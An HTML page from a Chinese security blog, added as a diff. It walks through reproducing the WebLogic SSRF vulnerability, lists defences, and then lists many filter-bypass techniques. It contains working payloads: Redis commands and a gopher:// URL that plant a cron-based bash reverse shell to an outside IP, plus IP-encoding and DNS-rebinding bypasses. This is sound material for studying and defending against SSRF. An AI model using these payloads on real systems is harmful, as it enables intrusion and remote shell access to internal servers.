@@ -1,0 +1,739 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="qiaqia">
+  <meta name="keywords" content="网络空间安全 web渗透">
+  
+    <meta name="description" content="weblogic之ssrfWeblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 1.什么是ssrf 中文名叫服务器请求伪造,是一种由攻击者构造形成由服务器端发起请求的一个安全漏洞. 一般情况下,ssrf攻击的目标是从外网无法访问的内部系统. 2.危害 一般我们无法请求到系统上的文件,内网的ip我们也是无法访问的,有了ssr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogic之ssrf負現">
+<meta property="og:url" content="https://www.dongw.cf/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/index.html">
+<meta property="og:site_name" content="qiaqia专属记录">
+<meta property="og:description" content="weblogic之ssrfWeblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 1.什么是ssrf 中文名叫服务器请求伪造,是一种由攻击者构造形成由服务器端发起请求的一个安全漏洞. 一般情况下,ssrf攻击的目标是从外网无法访问的内部系统. 2.危害 一般我们无法请求到系统上的文件,内网的ip我们也是无法访问的,有了ssr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dongw.cf/img/f.jpg">
+<meta property="article:published_time" content="2022-01-30T13:01:53.000Z">
+<meta property="article:modified_time" content="2022-10-26T15:18:43.650Z">
+<meta property="article:author" content="qiaqia">
+<meta property="article:tag" content="网络空间安全 web渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.dongw.cf/img/f.jpg">
+  
+  
+  
+  <title>weblogic之ssrf負現 ~ qiaqia专属记录</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dongw.cf","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"ture","follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>qiaqia</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="weblogic之ssrf負現"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-30 21:01" pubdate>
+          2022年1月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">weblogic之ssrf負現</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h6 id="weblogic之ssrf"><a href="#weblogic之ssrf" class="headerlink" title="weblogic之ssrf"></a>weblogic之ssrf</h6><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<p>1.什么是ssrf</p>
+<p>中文名叫服务器请求伪造,是一种由攻击者构造形成由服务器端发起请求的一个安全漏洞.</p>
+<p>一般情况下,ssrf攻击的目标是从外网无法访问的内部系统.</p>
+<p>2.危害</p>
+<p>一般我们无法请求到系统上的文件,内网的ip我们也是无法访问的,有了ssrf后,我们提交的加载连接使用服务器进行加载解析,实际上相当于我们以存在ssrf这个服务器为跳板进行的一些加载操作.</p>
+<p>一般ssrf漏洞的页面是get请求,访问内网地址的时候返回的是状态码,根据返回信息,我们可以对内网的ip和端口进行信息收集,可以收集到一些内网机子的开放情况</p>
+<p>redis(6379默认),比如redis服务，如果内网有IP开启6379端口，那么我们就可以用存在ssrf的机子给含有redis服务的机子发送命令，然后反弹shell.</p>
+<p>有些ssrf还可以利用file协议对目标机本地的文件进行读取</p>
+<p>一.环境搭建</p>
+<p>在浏览器中访问<a target="_blank" rel="noopener" href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a> 控制台，看看是否能显示</p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231347168.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以正常访问。</p>
+<p>3.1、直接访问：<a target="_blank" rel="noopener" href="http://ip:7001/uddiexplorer/">http://ip:7001/uddiexplorer/</a> ,SSRF漏洞存在于：<a target="_blank" rel="noopener" href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231420525.png" srcset="/img/loading.gif" lazyload></p>
+<p>进行抓包,注意拿到的数据包不能进行更改,原模原样进行命令执行</p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231446037.png" srcset="/img/loading.gif" lazyload></p>
+<p>3.2、向服务器提交以下参数</p>
+<p>?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:7001/">http://127.0.0.1:7001</a></p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231514240.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231534521.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231552178.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个返回信息说明这个ip是存在的并且这个端口是开放的。</p>
+<p>那么我们怎么知道他内网的ip呢，这个页面的Setup UDDI Explorer处泄露了网段，可以用脚本或者工具来跑</p>
+<p>试着去访问一个不存在的端口，那么下面就会返回这样的信息，代表这个端口没有开放，不能访问。</p>
+<p>ssrf漏洞的pdf，里面有四种回显信息</p>
+<p><img src="/2022/01/30/weblogic%E4%B9%8Bssrf%E8%B2%A0%E7%8F%BE/image-20221026231620385.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h2><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
+<p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p>
+<p>set 1 “ * * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.222&#x2F;7778 0&gt;&amp;1 ”</p>
+<p>config set dir &#x2F;etc&#x2F;</p>
+<p>config set dbfilename crontab</p>
+<p>save</p>
+<p><strong>06防御方式</strong></p>
+<p>1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</p>
+<p>3、限制请求的端口，比如80,443,8080,8090。</p>
+<p>4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题。</p>
+<p>5、使用DNS缓存或者Host白名单的方式。</p>
+<p><strong>07绕过方式</strong></p>
+<p>1.@绕过<br><a target="_blank" rel="noopener" href="http://www.baidu.com@10.10.10.10与http//10.10.10.10%E8%AF%B7%E6%B1%82%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84">http://www.baidu.com@10.10.10.10与http://10.10.10.10请求是相同的</a></p>
+<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
+<p>360会阻止这种访问方式，访问显示空白页，</p>
+<p>firefox、chrome可以这样访问</p>
+<p>2.ip地址转换绕过<br>有些ssrf防护措施，会对输入的URL做正则匹配，限制内网地址，比如192、168这些地址，但如果转换成其他格式的ip地址，可能会绕过</p>
+<p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p>
+<p>(1)、8进制格式：0300.0250.0.1<br>(2)、16进制格式：0xC0.0xA8.0.1<br>(3)、10进制整数格式：3232235521<br>(4)、16进制整数格式：0xC0A80001<br>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p>
+<p>3.短网址绕过</p>
+<p>网上有很多将网址转换未短网址的网站<br>比如<br><code>www.baidu.com</code>与<code>https://dwz.lc/2fGYWaE</code>一样</p>
+<p>4.利用302跳转</p>
+<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中(先假装访问你服务器上构造的302跳转内网地址)</p>
+<p>5.利用其他协议绕过<br>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>
+<p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_<em>1%0d%0a$8%0d%0aflushall%0d%0a</em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1* * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a<br>1<br>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:&#x2F;&#x2F;&#x2F;文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:&#x2F;&#x2F;&#x2F;d:&#x2F;1.txt 来访问D盘中1.txt的内容</p>
+<p>6.DNS重绑定</p>
+<p>它会执行两次dns解析,构造属于自己的网址和对应的公网ip,并设置自己自己的dns服务器,让有漏洞的服务器去访问你的服务器,然后你的dns解析一个外网地址给有漏洞的服务器,他就会认为你是合法的放行,但是ttl到期之后,会再次进行dns解析,这时候你的dns服务器给这个你的网站解析为有漏洞服务器所处于的网段中的一个ip地址,并进行端口,服务等探测</p>
+<h2 id="利用句号绕过"><a href="#利用句号绕过" class="headerlink" title="利用句号绕过"></a>利用句号绕过</h2><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+<h2 id="利用Enclosed-alphanumerics绕过"><a href="#利用Enclosed-alphanumerics绕过" class="headerlink" title="利用Enclosed alphanumerics绕过"></a>利用Enclosed alphanumerics绕过</h2><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
+<h2 id="基于快速网址绕过"><a href="#基于快速网址绕过" class="headerlink" title="基于快速网址绕过"></a>基于快速网址绕过</h2><h2 id="xip-ip"><a href="#xip-ip" class="headerlink" title="xip.ip"></a>xip.ip</h2><p>xip.io这是个特别的 域名，是别人搭好的网站，具体信息可以访问来查看，他会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理  127.0.0.1.xip.ip&#x3D;&#x3D;127.0.0.1</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86/" class="category-chain-item">漏洞收集</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>weblogic之ssrf負現</div>
+      <div>https://www.dongw.cf/2022/01/30/weblogic之ssrf負現/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>qiaqia</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/26/Shiro%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro框架反序列化漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Shiro框架反序列化漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/28/shiro-CVE-2020-1957-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="shiro CVE-2020-1957(未授权访问.)">
+                        <span class="hidden-mobile">shiro CVE-2020-1957(未授权访问.)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/date.js"></script> </div> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      粤ICP备2021013948号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+
+
+	  </div>
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
